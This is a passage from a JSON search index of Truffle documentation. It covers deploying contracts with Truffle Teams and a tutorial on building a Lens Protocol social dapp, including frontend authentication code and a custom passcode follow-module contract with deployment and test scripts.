three columns: Commits , Staging , and Production .", "title": "The Deployments Page"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/#commits-column", "text": "Commits is a list of all the commits that Truffle Teams is processing, or has processed, as a build. Each will have a status icon to show if the build is in progress, failed, or successful. Commits with a successful icon (a green box with a checkmark, as pictured) will be able to be deployed; the parachute icon in the top right of the commit indicates this.", "title": "Commits Column"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/#staging-and-production-columns", "text": "Staging contains a list of all testnet (i.e. Ropsten, G\u00f6rli, Rinkeby, and Kovan) deployments. Production contains a list of Mainnet deployments. We'll expand more on how these work later in the tutorial.", "title": "Staging and Production Columns"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/#your-first-deployment", "text": "Currently, Truffle Teams supports Ethereum testnets and Mainnet, and we'll be adding support for other targets over time. In this tutorial, we'll be deploying our application to Ropsten. Press the parachute icon on the commit you'd like to deploy. A wizard will pop up; under Destination Network, select Ropsten, and then press Connect Wallet . MetaMask will pop up asking you to login (if you haven't already). Then you will need to press Connect to confirm the connection with Truffle Teams. If the wizard hasn't changed (i.e. you don't see a button to start deploying), you likely need to switch your MetaMask network to Ropsten. This may reload the page; if this happens, you'll need to repeat the steps above. Before moving on, make sure you have the correct account selected in MetaMask. Now you should see the wizard prompting for a Deployment Context . Leave it set to Create a New Deployment . We'll cover what this is later in the tutorial. Press the OK, START DEPLOYING button! From here on, it's important that you don't close the tab, refresh the page, or lose network connection. We're working on a more robust experience that will enable you to pick up unfinished deployments, but for now our current version requires the tab to stay open and connected. Truffle Teams will only process so many deployments at the same time, so you may see that your deployment has been queued. You'll have to wait (without closing/refreshing the tab) for your deployment to get to the front of the list. However, we're working diligently to make this experience more seamless going forward. Once your deployment has started processing, you'll see a list of steps Truffle Teams is doing to prepare for your deployment. Once the preparation steps are complete, you'll see a screen with a list of your migrations being processed. You should also get a pop-up from MetaMask for your first transaction. You'll notice that this interface with MetaMask is like sending a transaction to any other dapp. It's your account that is sending this transaction, and you have complete control of it. Additionally, we highly recommend that you change the GAS FEE to be higher so that your transactions run quicker. For testnets like Ropsten, it's affordable to always select the Fast option. Once you're happy with the transaction gas fee, press the Confirm button to send your transaction. Once the transaction is confirmed (the timing of confirmations from MetaMask and Truffle Teams may be slightly offset), you'll receive the next transaction. Repeat this process until you see a message that your deployment is being finalized. After a short wait, you'll see a window with your deployment results: Your contracts are deployed! That was easy. Go ahead and push the Great! Go Back to Workflow button or the X in the wizard. You'll now see a new card in the Staging column with the results of your deployment: You can click on the + Contracts bar on the bottom of the card to see a list of your deployed contracts and their addresses: You can also click the vertical 3 dots in the top right of the card to find a menu. In this menu, you can download a .zip file of the Truffle .json artifacts used in your frontend webapp, graduate a deployment to production, or archive the deployment. Note: Be careful when using the archive feature; we haven't implemented a way to unarchive deployments yet.", "title": "Your First Deployment"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/#deployment-context", "text": "Circling back to the Deployment Context feature I brushed over earlier when we were setting up our deployment: This setting will usually be used for more advanced Truffle applications that utilize the migration system to iteratively migrate more to the blockchain (rather than starting fresh each deployment). This option will let you select an existing deployment on the same network that you'd like to use the deployed artifacts for. Truffle supports the concept of migrating your application and will only run the new migration scripts from the last deployment (a.k.a. the deployment context). This becomes useful in a handful of scenarios: maybe you added an extra contract to work with your existing deployment, your Truffle project uses proxy contracts to upgrade your contracts, and more. Technically speaking, selecting the Deployment Context will put the Truffle artifacts from the deployment context you selected in the directory before running truffle migrate .", "title": "Deployment Context"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/#graduating-deployments", "text": "Happy with a particular deployment in Staging ? You can select the Graduate option from the menu to use the same build as the basis of your deployment into Mainnet. Other than selecting a different network in MetaMask, the steps are the same! After you're done, you'll see a new deployment in the production section. Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams", "title": "Graduating Deployments"}, {"location": "guides/lens-protocol/", "text": "Web3 Unleashed: Decentralized social media with Lens \u00b6 Written by Emily Lin Last updated 1/31/2023 Overview \u00b6 Web3 is revolutionizing the social media landscape. In this guide, we'll cover how to use the Truffle Lens box to start building your social media dapp. We'll walk through what's in it and provide an example of how you can customize the Lens Protocol by creating a Follow Module. Watch the livestream on YouTube to hear from Nader Dabit about how Lens Protocol is onboarding the next million of web3 users. The Lens box code lives here . Download System Requirements \u00b6 You'll need to install: Node.js , v14 or higher truffle ganache CLI Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Here's a site that links to different Goerli and Sepolia ETH faucets. Unbox the Truffle box \u00b6 First, let's examine the contents of the Truffle Lens box. Start off by unboxing it: truffle unbox lens <DIRECTORY_NAME> In this box, we have two folders: lens-app and truffle . Let's dive into what's in each folder and how you might edit the contents to create your own social dapp! lens-app : your frontend code \u00b6 You can build on Lens without writing any smart contracts because they've provided a robust API that will interact with their contracts for you. You can find the documentation for the API here . lens-app contains frontend code that leverages Next.js and Tailwind CSS to build a app that: Prompts the user to connect their wallet Displays the top profiles on Lens Allows the user to click into and see the posts by the top profiles on Lens First, let's install the dependencies: cd lens-app npm i Let's dive into the important pieces of code that demonstrate how to leverage the Lens API. This assumes you already have understanding of Next.js and frontend development. lens-app/api.js \u00b6 In order to interact with Lens, we first need to create the api. To do this, you'll need to construct GraphQL queries. We're doing so with Apollo client . The first thing we do in this file is create our Apollo client. While reading data from the Lens API is as simple as sending a GraphQL query, we need to either be authenticated or write a transaction directly to the Lens smart contracts to make any state change, like following, unfollowing, creating a post, and creating a mirror. Lines 1-23 demonstrate how to create an authenticated Apollo client: import { ApolloClient , InMemoryCache , gql , createHttpLink } from '@apollo/client' import { setContext } from '@apollo/client/link/context' ; const API_URL = 'https://api.lens.dev' const authLink = setContext (( _ , { headers }) => { const token = window . localStorage . getItem ( 'your-storage-key' ) return { headers : { ... headers , authorization : token ? `Bearer ${ token } ` : \"\" , } } }) const httpLink = createHttpLink ({ uri : API_URL }) export const client = new ApolloClient ({ link : authLink . concat ( httpLink ), cache : new InMemoryCache () }) Do note that we are getting our authenticated token from localStorage , which we write to in index.tsx . You can read more about it in the section below. The remaining code in this file represent different GraphQL queries that get the information we want from Lens. The challenge and authenticate queries are specifically used for authentication, while exploreProfiles , getProfile , and getPublications are for reading data from Lens. lens-app/pages/index.tsx \u00b6 This is the home page of our dapp. It requires the user to be connected and authenticated before rendering all the Lens profile information. You can read more about the login process here . To do the authentication, the important functions to highlight are: checkConnection async function checkConnection () { const provider = new ethers . providers . Web3Provider ( window . ethereum ) const accounts = await provider . listAccounts () if ( accounts . length ) { setAddress ( accounts [ 0 ]) } } This function checks to see if the user has already connected their wallet when the app loads and saves the address of the connected account. connect async function connect () { /* this allows the user to connect their wallet */ const account = await window . ethereum . send ( 'eth_requestAccounts' ) if ( account . result . length ) { setAddress ( account . result [ 0 ]) } } If the user has not yet connected their account, this function will allow them to do so by using the MetaMask Provider API await window.ethereum.send('eth_requestAccounts') . login async function login () { try { /* first request the challenge from the API server */ const challengeInfo = await client . query ({ query : challenge , variables : { address } }) const provider = new ethers . providers . Web3Provider ( window . ethereum ); const signer = provider . getSigner () /* ask the user to sign a message with the challenge info returned from the server */ const signature = await signer . signMessage ( challengeInfo . data . challenge . text ) /* authenticate the user */ const authData = await client . mutate ({ mutation : authenticate , variables : { address , signature } }) /* if user authentication is successful, you will receive an accessToken and refreshToken */ const { data : { authenticate : { accessToken }}} = authData console . log ({ accessToken }) setToken ( accessToken ) window . localStorage . setItem ( 'your-storage-key' , accessToken ) } catch ( err ) { console . log ( 'Error signing in: ' , err ) } } Finally, to get our token, we need to issue a challenge and get the user to sign it using their wallet. To do so, we'll be using the challenge and authenticate queries we created in api.js . Once we get the token, we save it to localStorage . Note that we call setToken(window.localStorage.getItem('your-storage-key')) in the useEffect so that we don't have to re-authenticate every time we refresh the page. Once the user is logged in, we display the top Lens profiles! Getting that information is as simple as calling the exploreProfiles query we defined in api.js : async function fetchProfiles () { try { /* fetch profiles from Lens API */ let response = await client . query ({ query : exploreProfiles }) /* loop over profiles, create properly formatted ipfs image links */ let profileData = await Promise . all ( response . data . exploreProfiles . items . map ( async profileInfo => { let profile = { ... profileInfo } let picture = profile . picture if ( picture && picture . original && picture . original . url ) { if ( picture . original . url . startsWith ( 'ipfs://' )) { let result = picture . original . url . substring ( 7 , picture . original . url . length ) profile . avatarUrl = `http://lens.infura-ipfs.io/ipfs/ ${ result } ` } else { profile . avatarUrl = picture . original . url } } return profile })) /* update the local state with the profiles array */ setProfiles ( profileData ) } catch ( err ) { console . log ({ err }) } } lens-app/pages/profile/[handle].js \u00b6 The last hook-in to the Lens API is in [handle].js . If you notice on line 114 in index.tsx , you can navigate to a detailed view of the user's profile. This will simply direct you to [handle].js , where we format the data queried from the Lens API: const returnedProfile = await client . query ({ query : getProfile , variables : { handle } }) const pubs = await client . query ({ query : getPublications , variables : { id : profileData . id , limit : 50 } }) Running the dapp \u00b6 To see this code in action, simply call npm run dev . You can use this as a launching off point for more complex social dapps. If you don't need to write any smart contracts, you can just delete the truffle folder. truffle : your smart contract code \u00b6 The truffle folder contains the set up for if you want to build Lens modules to customize Lens' capabilities. For example, if you wanted to change the comment mechanism such that only NFT holders can comment, you can do that by writing smart contracts to create a reference module . Lens will then call into that module at pre-determined points to execute your custom functionality! Before we dive into creating our own module, let's go over what's in the box so far. truffle/contracts \u00b6 This folder contains all the Lens protocol contracts. In order to create a module, we'll be adding a smart contract here under truffle/contracts/core/modules . truffle/migrations/1_deploy_lens_protocol.js \u00b6 This file deploys all the existing Lens Protocol contracts. There are some key pieces to highlight that are more complex than simply deploying individual contracts. First off, we specify a few important addresses to take into account: const deployerAddress = accounts [ 0 ]; const governanceAddress = accounts [ 1 ]; const treasuryAddress = accounts [ 2 ]; const proxyAdminAddress = deployerAddress ; const profileCreatorAddress = deployerAddress ; Lens Protocol contracts are upgradeable contracts, which you can learn more about in our 3rd episode about upgradeble contracts with OpenZeppelin. Because upgradeable contracts are proxy contracts, we must provide an admin, who has the authority to upgrade the contracts should the need arise: await deployer . deploy ( TransparentUpgradeableProxy , lensHubImpl . address , proxyAdminAddress , data , { nonce : deployerNonce ++ }); Moving forward, we only want to interact with the proxy address and not the LensHub implementation contract. You can see us create our contract abstraction based off of the proxy in lines 114-116: let proxy = await TransparentUpgradeableProxy . deployed (); let lensHub = await LensHub . at ( proxy . address ); Additionally, you'll note that we pass in the parameter data to our proxy deployment, defined as follows: let data = await web3 . eth . abi . encodeFunctionCall ({ \"inputs\" : [ { \"internalType\" : \"string\" , \"name\" : \"name\" , \"type\" : \"string\" }, { \"internalType\" : \"string\" , \"name\" : \"symbol\" , \"type\" : \"string\" }, { \"internalType\" : \"address\" , \"name\" : \"newGovernance\" , \"type\" : \"address\" } ], \"name\" : \"initialize\" , \"outputs\" : [], \"stateMutability\" : \"nonpayable\" , \"type\" : \"function\" }, [ LENS_HUB_NFT_NAME , LENS_HUB_NFT_SYMBOL , governanceAddress ]); We pass in governanceAddress , which is the only address that can call certain LensHub methods. In order to call a function such that msg.sender is governanceAddress , you can pass it in by modifying the from property like so: await lensHub . whitelistCollectModule ( feeCollectModule . address , true , { nonce : governanceNonce ++ , from : governanceAddress }) We'll need to start a local test chain using Ganache to start interacting with this protocol. In addition to deploying each of our contracts, lines 207 to 245 in the migrations file whitelists our module smart contracts so that Lens can call into them. What's also interesting about this deployment is linking library contracts: console . log ( '\\n\\t-- Deploying Hub Implementation --' ); await LensHub . link ( hubLibs ); await deployer . deploy ( LensHub , followNFTImplAddress , collectNFTImplAddress , { nonce : deployerNonce ++ , gas : 25000000 }); let lensHubImpl = await LensHub . deployed (); You cannot deploy contracts that are greater than 24.77 kib in size. In order to get around this restriction, there are two things we do: Extracting functionality out into libraries Optimizing contract compilation in our truffle-config.js // Configure your compilers compilers : { solc : { version : \"0.8.10\" , // Fetch exact version from solc-bin (default: truffle's version) // docker: true, // Use \"0.5.1\" you've installed locally with docker (default: false) settings : { // See the solidity docs for advice about optimization and evmVersion optimizer : { enabled : true , runs : 200 }, // evmVersion: \"byzantium\" } } }, You can read more about optimizers here . In short, the optimizer attempts to simplify complex code, with the tradeoff being deployment cost against execution cost. If this is off, this contract will fail to deploy! The last piece that is interesting about this deployment is that we write all the relevant contract addresses to a file named addresses.json . This will be used later in our scripts when interacting with the Lens smart contracts. truffle/scripts \u00b6 This folder contains scripts that interact with the Lens protocol. In utils.js , we create some functions that help us easily retrieve common information. Note that getAddrs will read from the file we created in our migration script. Because it calls into the relative file path ./addresses.json , you have to execute scripts from the root truffle folder. Otherwise, the script will fail because it can't find ./addresses.json . You can only interact with it when it is unpaused, which you can do by calling truffle exec scripts/unpause.js after you've deployed the Lens contracts. Again, you'll note that we modify the from parameter in several contract calls. We send from the governance address when calling functions in LensHub contract that contains the onlyGov modifier await lensHub . whitelistCollectModule ( freeCollectModuleAddr , true , { from : governance }); 2. We send from a user address when calling functions that perform user interactions, such as making a post await lensHub . post ( inputStruct , { from : user }); truffle/.env and truffle/truffle-config.js \u00b6 These two files define the networks that you can deploy the Lens contracts to. You can get the RPC URLs from your Infura account and use the mnemonic from your MetaMask wallet. Be sure to never expose this information! Running the protocol \u00b6 In order to deploy our contracts locally, you need to spin up a local instance of Ganache: ganache This will default to port 8545, which is designated as our development network in our truffle-config.js . Then, to deploy: truffle migrate If you want to deploy to other networks, you can run: truffle migrate --network <NETWORK_NAME> Because there are so many contracts, compilation will take some time. Do note that every time you run the migration, it will overwrite what contract addresses have been written to addresses.json . Build your own module \u00b6 Now, we'll demonstrate how to create a custom module using the Truffle box. In this case, we'll only be working within the truffle folder. The completed code for the module lives here . Write the module smart contract \u00b6 Let's customize the Lens follow functionality. Specifically, we want to specify that the user has to enter a password in order for them to follow a particular profile. Start off by creating a smart contract truffle/contracts/core/modules/follow/SecretCodeFollowModule.sol . Then, let's define our imports: pragma solidity 0.8.10 ; import { IFollowModule } from '../../../interfaces/IFollowModule.sol' ; import { ModuleBase } from '../ModuleBase.sol' ; import { FollowValidatorFollowModuleBase } from './FollowValidatorFollowModuleBase.sol' ; IFollowModule defines the functions Lens will hook into to customize the follow behavior. To explain the functions it defines: InitializeFollowModule() is called when a profile sets this module as its follow module. ProcessFollow() is called when a user attempts to follow a given profile with this module set as its follow module. FollowModuleTransferHook() is called when a FollowNFT associated with a profile that has this module set as its follow module is transferred ValidateFollow() which` is called to validate whether a follow is still valid ModuleBase exposes an onlyHub modifier and HUB address. FollowValidatorFollowModuleBase implements `isFollowing, which is one of the functions we need to define in the interface Now, let's create a contract that inherits these imports: contract SecretCodeFollowModule is IFollowModule , FollowValidatorFollowModuleBase { } Then, let's define some variables we'll need. We'll create a custom error that indicates the wrong passcode was input and a mapping that associates passwords with profiles. error PasscodeInvalid (); mapping ( uint256 => uint256 ) internal _passcodeByProfile ; Then, add SecretCodeFollowModule 's constructor, which inherits from ModuleBase . constructor ( address hub ) ModuleBase ( hub ) {} Finally, we'll implement the interface functions: function initializeFollowModule ( uint256 profileId , bytes calldata data ) external override onlyHub returns ( bytes memory ) { uint256 passcode = abi . decode ( data , ( uint256 )); _passcodeByProfile [ profileId ] = passcode ; return data ; } function processFollow ( address follower , uint256 profileId , bytes calldata data ) external view override { uint256 passcode = abi . decode ( data , ( uint256 )); if ( passcode != _passcodeByProfile [ profileId ]) revert PasscodeInvalid (); } function followModuleTransferHook ( uint256 profileId , address from , address to , uint256 followNFTTokenId ) external override {} Note that we don't implement anything in followModuleTransferHook because we don't need to use it! Your final smart contract code should look like this: pragma solidity 0.8.10 ; import { IFollowModule } from '../../../interfaces/IFollowModule.sol' ; import { ModuleBase } from '../ModuleBase.sol' ; import { FollowValidatorFollowModuleBase } from './FollowValidatorFollowModuleBase.sol' ; contract SecretCodeFollowModule is IFollowModule , FollowValidatorFollowModuleBase { error PasscodeInvalid (); mapping ( uint256 => uint256 ) internal _passcodeByProfile ; constructor ( address hub ) ModuleBase ( hub ) {} function initializeFollowModule ( uint256 profileId , bytes calldata data ) external override onlyHub returns ( bytes memory ) { uint256 passcode = abi . decode ( data , ( uint256 )); _passcodeByProfile [ profileId ] = passcode ; return data ; } function processFollow ( address follower , uint256 profileId , bytes calldata data ) external view override { uint256 passcode = abi . decode ( data , ( uint256 )); if ( passcode != _passcodeByProfile [ profileId ]) revert PasscodeInvalid (); } function followModuleTransferHook ( uint256 profileId , address from , address to , uint256 followNFTTokenId ) external override {} } Deploy your new contract! \u00b6 Let's create a new file truffle/migrations/2_deploy_SecretCodeFollowModule.js . As in our previous migration file, we have to define our LensHub contract based on the proxy address. Then, in order for us to use the new module, we have to whitelist it, calling the function from the governanceAddress . const SecretCodeFollowModule = artifacts . require ( \"SecretCodeFollowModule\" ); const TransparentUpgradeableProxy = artifacts . require ( \"TransparentUpgradeableProxy\" ); const LensHub = artifacts . require ( \"LensHub\" ); module . exports = async function ( deployer , networks , accounts ) { const governanceAddress = accounts [ 1 ]; const proxy = await TransparentUpgradeableProxy . deployed (); const lensHub = await LensHub . at ( proxy . address ); await deployer . deploy ( SecretCodeFollowModule , lensHub . address ) const secretCodeFollowModule = await SecretCodeFollowModule . deployed (); await lensHub . whitelistFollowModule ( secretCodeFollowModule . address , true , { from : governanceAddress }); } Since we don't want to rerun the first migration, you can use the --f flag to specify exactly which migration file you want to execute: truffle migrate --f 2 Write a script to test the new module \u00b6 Now, let's write a script that will call on the new follow functionality. Create a file truffle/scripts/secret_follow.js , and add this code: const { defaultAbiCoder } = require ( 'ethers/lib/utils' ); const { getAddrs , initEnv , ProtocolState , ZERO_ADDRESS , } = require ( './helpers/utils' ); const LensHub = artifacts . require ( \"LensHub\" ); const FollowNFT = artifacts . require ( \"FollowNFT\" ); const SecretCodeFollowModule = artifacts . require ( \"SecretCodeFollowModule\" ); const main = async ( cb ) => { try { const [ governance , , user ] = await initEnv ( web3 ); const addrs = getAddrs (); const lensHub = await LensHub . at ( addrs [ 'lensHub proxy' ]); await lensHub . setState ( ProtocolState . Unpaused , { from : governance }); await lensHub . whitelistProfileCreator ( user , true , { from : governance }); // Will fail if you've already minted this profile // const inputStruct = { // to: user, // handle: 'zer0dot', // imageURI: // 'https://ipfs.fleek.co/ipfs/ghostplantghostplantghostplantghostplantghostplantghostplan', // followModule: ZERO_ADDRESS, // followModuleInitData: [], // followNFTURI: // 'https://ipfs.fleek.co/ipfs/ghostplantghostplantghostplantghostplantghostplantghostplan', // }; // await lensHub.createProfile(inputStruct, {from: user}); const data = defaultAbiCoder . encode ([ 'uint256' ], [ '42069' ]); const secretCodeFollowModule = await SecretCodeFollowModule . deployed (); await lensHub . setFollowModule ( 1 , secretCodeFollowModule . address , data , { from : user }); try { await lensHub . follow ([ 1 ], [ badData ], { from : user , gas : \"0xfffff\" }); } catch ( e ) { console . log ( `Expected failure occurred! Error: ${ e } ` ); } await lensHub . follow ([ 1 ], [ data ], { from : user }); const followNFTAddr = await lensHub . getFollowNFT ( 1 , { from : governance }); const followNFT = await FollowNFT . at ( followNFTAddr ); const totalSupply = await followNFT . totalSupply ({ from : user }); const ownerOf = await followNFT . ownerOf ( 1 , { from : user }); console . log ( `Follow NFT total supply (should be 1): ${ totalSupply } ` ); console . log ( `Follow NFT owner of ID 1: ${ ownerOf } , user address (should be the same): ${ user } ` ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; Replace [SecretFollowModuleAddress] in line 36 with the contract address. You can easily find it by running truffle networks . If you haven't executed the create-profile script yet, you can uncomment the profile creation piece of this code. Otherwise, if you have created a profile, leave that portion commented, since you cannot create two profiles with the same username. To run, simply call: truffle exec scripts/secret_follow.js You should see something a bit like this: Using network 'development' . Expected failure occurred! Error: StatusError: Transaction: 0x1c22b1e9b35d6531b22e22d807d58be55c96a81e343bf2bb3f5bd35145a1b255 exited with an error ( status 0 ) . Reason given: Custom error ( could not decode ) . Please check that the transaction: - satisfies all conditions set by Solidity ` require ` statements. - does not trigger a Solidity ` revert ` statement. Follow NFT total supply ( should be 1 ) : 1 Follow NFT owner of ID 1 : 0xA9A3b27098f4446a1019F75e1164F4ca1980727e, user address ( should be the same ) : 0xA9A3b27098f4446a1019F75e1164F4ca1980727e The first failure is expected because we intentionally input the wrong password! Future extensions \u00b6 So there you have it! We've gone over how to incorporate the Lens API into your dapp frontends and how to customize the Lens functionality by modifying their smart contracts using modules. There are a variety of ways to extend this content, such as creating a more fully fleshed dapp like Twitter or gating Lens actions through NFT ownership. Let us know how you utilized the Lens box by joining our community! If you want to talk about this content, join our Discord ! If you need help coding, start a discussion here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Decentralized social media with Lens"}, {"location": "guides/lens-protocol/#web3-unleashed-decentralized-social-media-with-lens", "text": "Written by Emily Lin Last updated 1/31/2023", "title": "Web3 Unleashed: Decentralized social media with Lens"}, {"location": "guides/lens-protocol/#overview", "text": "Web3 is revolutionizing the social media landscape. In this guide, we'll cover how to use the Truffle Lens box to start building your social media dapp. We'll walk through what's in it and provide an example of how you can customize the Lens Protocol by creating a Follow Module. Watch the livestream on YouTube to hear from Nader Dabit about how Lens Protocol is onboarding the next million of web3 users. The Lens box code lives here .", "title": "Overview"}, {"location": "guides/lens-protocol/#download-system-requirements", "text": "You'll need to install: Node.js , v14 or higher truffle ganache CLI", "title": "Download System Requirements"}, {"location": "guides/lens-protocol/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here .", "title": "Create an Infura account and project"}, {"location": "guides/lens-protocol/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/lens-protocol/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/lens-protocol/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Here's a site that links to different Goerli and Sepolia ETH faucets.", "title": "Get Some Test Eth"}, {"location": "guides/lens-protocol/#unbox-the-truffle-box", "text": "First, let's examine the contents of the Truffle Lens box. Start off by unboxing it: truffle unbox lens <DIRECTORY_NAME> In this box, we have two folders: lens-app and truffle . Let's dive into what's in each folder and how you might edit the contents to create your own social dapp!", "title": "Unbox the Truffle box"}, {"location": "guides/lens-protocol/#lens-app-your-frontend-code", "text": "You can build on Lens without writing any smart contracts because they've provided a robust API that will interact with their contracts for you. You can find the documentation for the API here . lens-app contains frontend code that leverages Next.js and Tailwind CSS to build a app that: Prompts the user to connect their wallet Displays the top profiles on Lens Allows the user to click into and see the posts by the top profiles on Lens First, let's install the dependencies: cd lens-app npm i Let's dive into the important pieces of code that demonstrate how to leverage the Lens API. This assumes you already have understanding of Next.js and frontend development.", "title": "lens-app: your frontend code"}, {"location": "guides/lens-protocol/#lens-appapijs", "text": "In order to interact with Lens, we first need to create the api. To do this, you'll need to construct GraphQL queries. We're doing so with Apollo client . The first thing we do in this file is create our Apollo client. While reading data from the Lens API is as simple as sending a GraphQL query, we need to either be authenticated or write a transaction directly to the Lens smart contracts to make any state change, like following, unfollowing, creating a post, and creating a mirror. Lines 1-23 demonstrate how to create an authenticated Apollo client: import { ApolloClient , InMemoryCache , gql , createHttpLink } from '@apollo/client' import { setContext } from '@apollo/client/link/context' ; const API_URL = 'https://api.lens.dev' const authLink = setContext (( _ , { headers }) => { const token = window . localStorage . getItem ( 'your-storage-key' ) return { headers : { ... headers , authorization : token ? `Bearer ${ token } ` : \"\" , } } }) const httpLink = createHttpLink ({ uri : API_URL }) export const client = new ApolloClient ({ link : authLink . concat ( httpLink ), cache : new InMemoryCache () }) Do note that we are getting our authenticated token from localStorage , which we write to in index.tsx . You can read more about it in the section below. The remaining code in this file represent different GraphQL queries that get the information we want from Lens. The challenge and authenticate queries are specifically used for authentication, while exploreProfiles , getProfile , and getPublications are for reading data from Lens.", "title": "lens-app/api.js"}, {"location": "guides/lens-protocol/#lens-apppagesindextsx", "text": "This is the home page of our dapp. It requires the user to be connected and authenticated before rendering all the Lens profile information. You can read more about the login process here . To do the authentication, the important functions to highlight are: checkConnection async function checkConnection () { const provider = new ethers . providers . Web3Provider ( window . ethereum ) const accounts = await provider . listAccounts () if ( accounts . length ) { setAddress ( accounts [ 0 ]) } } This function checks to see if the user has already connected their wallet when the app loads and saves the address of the connected account. connect async function connect () { /* this allows the user to connect their wallet */ const account = await window . ethereum . send ( 'eth_requestAccounts' ) if ( account . result . length ) { setAddress ( account . result [ 0 ]) } } If the user has not yet connected their account, this function will allow them to do so by using the MetaMask Provider API await window.ethereum.send('eth_requestAccounts') . login async function login () { try { /* first request the challenge from the API server */ const challengeInfo = await client . query ({ query : challenge , variables : { address } }) const provider = new ethers . providers . Web3Provider ( window . ethereum ); const signer = provider . getSigner () /* ask the user to sign a message with the challenge info returned from the server */ const signature = await signer . signMessage ( challengeInfo . data . challenge . text ) /* authenticate the user */ const authData = await client . mutate ({ mutation : authenticate , variables : { address , signature } }) /* if user authentication is successful, you will receive an accessToken and refreshToken */ const { data : { authenticate : { accessToken }}} = authData console . log ({ accessToken }) setToken ( accessToken ) window . localStorage . setItem ( 'your-storage-key' , accessToken ) } catch ( err ) { console . log ( 'Error signing in: ' , err ) } } Finally, to get our token, we need to issue a challenge and get the user to sign it using their wallet. To do so, we'll be using the challenge and authenticate queries we created in api.js . Once we get the token, we save it to localStorage . Note that we call setToken(window.localStorage.getItem('your-storage-key')) in the useEffect so that we don't have to re-authenticate every time we refresh the page. Once the user is logged in, we display the top Lens profiles! Getting that information is as simple as calling the exploreProfiles query we defined in api.js : async function fetchProfiles () { try { /* fetch profiles from Lens API */ let response = await client . query ({ query : exploreProfiles }) /* loop over profiles, create properly formatted ipfs image links */ let profileData = await Promise . all ( response . data . exploreProfiles . items . map ( async profileInfo => { let profile = { ... profileInfo } let picture = profile . picture if ( picture && picture . original && picture . original . url ) { if ( picture . original . url . startsWith ( 'ipfs://' )) { let result = picture . original . url . substring ( 7 , picture . original . url . length ) profile . avatarUrl = `http://lens.infura-ipfs.io/ipfs/ ${ result } ` } else { profile . avatarUrl = picture . original . url } } return profile })) /* update the local state with the profiles array */ setProfiles ( profileData ) } catch ( err ) { console . log ({ err }) } }", "title": "lens-app/pages/index.tsx"}, {"location": "guides/lens-protocol/#lens-apppagesprofilehandlejs", "text": "The last hook-in to the Lens API is in [handle].js . If you notice on line 114 in index.tsx , you can navigate to a detailed view of the user's profile. This will simply direct you to [handle].js , where we format the data queried from the Lens API: const returnedProfile = await client . query ({ query : getProfile , variables : { handle } }) const pubs = await client . query ({ query : getPublications , variables : { id : profileData . id , limit : 50 } })", "title": "lens-app/pages/profile/[handle].js"}, {"location": "guides/lens-protocol/#running-the-dapp", "text": "To see this code in action, simply call npm run dev . You can use this as a launching off point for more complex social dapps. If you don't need to write any smart contracts, you can just delete the truffle folder.", "title": "Running the dapp"}, {"location": "guides/lens-protocol/#truffle-your-smart-contract-code", "text": "The truffle folder contains the set up for if you want to build Lens modules to customize Lens' capabilities. For example, if you wanted to change the comment mechanism such that only NFT holders can comment, you can do that by writing smart contracts to create a reference module . Lens will then call into that module at pre-determined points to execute your custom functionality! Before we dive into creating our own module, let's go over what's in the box so far.", "title": "truffle: your smart contract code"}, {"location": "guides/lens-protocol/#trufflecontracts", "text": "This folder contains all the Lens protocol contracts. In order to create a module, we'll be adding a smart contract here under truffle/contracts/core/modules .", "title": "truffle/contracts"}, {"location": "guides/lens-protocol/#trufflemigrations1_deploy_lens_protocoljs", "text": "This file deploys all the existing Lens Protocol contracts. There are some key pieces to highlight that are more complex than simply deploying individual contracts. First off, we specify a few important addresses to take into account: const deployerAddress = accounts [ 0 ]; const governanceAddress = accounts [ 1 ]; const treasuryAddress = accounts [ 2 ]; const proxyAdminAddress = deployerAddress ; const profileCreatorAddress = deployerAddress ; Lens Protocol contracts are upgradeable contracts, which you can learn more about in our 3rd episode about upgradeble contracts with OpenZeppelin. Because upgradeable contracts are proxy contracts, we must provide an admin, who has the authority to upgrade the contracts should the need arise: await deployer . deploy ( TransparentUpgradeableProxy , lensHubImpl . address , proxyAdminAddress , data , { nonce : deployerNonce ++ }); Moving forward, we only want to interact with the proxy address and not the LensHub implementation contract. You can see us create our contract abstraction based off of the proxy in lines 114-116: let proxy = await TransparentUpgradeableProxy . deployed (); let lensHub = await LensHub . at ( proxy . address ); Additionally, you'll note that we pass in the parameter data to our proxy deployment, defined as follows: let data = await web3 . eth . abi . encodeFunctionCall ({ \"inputs\" : [ { \"internalType\" : \"string\" , \"name\" : \"name\" , \"type\" : \"string\" }, { \"internalType\" : \"string\" , \"name\" : \"symbol\" , \"type\" : \"string\" }, { \"internalType\" : \"address\" , \"name\" : \"newGovernance\" , \"type\" : \"address\" } ], \"name\" : \"initialize\" , \"outputs\" : [], \"stateMutability\" : \"nonpayable\" , \"type\" : \"function\" }, [ LENS_HUB_NFT_NAME , LENS_HUB_NFT_SYMBOL , governanceAddress ]); We pass in governanceAddress , which is the only address that can call certain LensHub methods. In order to call a function such that msg.sender is governanceAddress , you can pass it in by modifying the from property like so: await lensHub . whitelistCollectModule ( feeCollectModule . address , true , { nonce : governanceNonce ++ , from : governanceAddress }) We'll 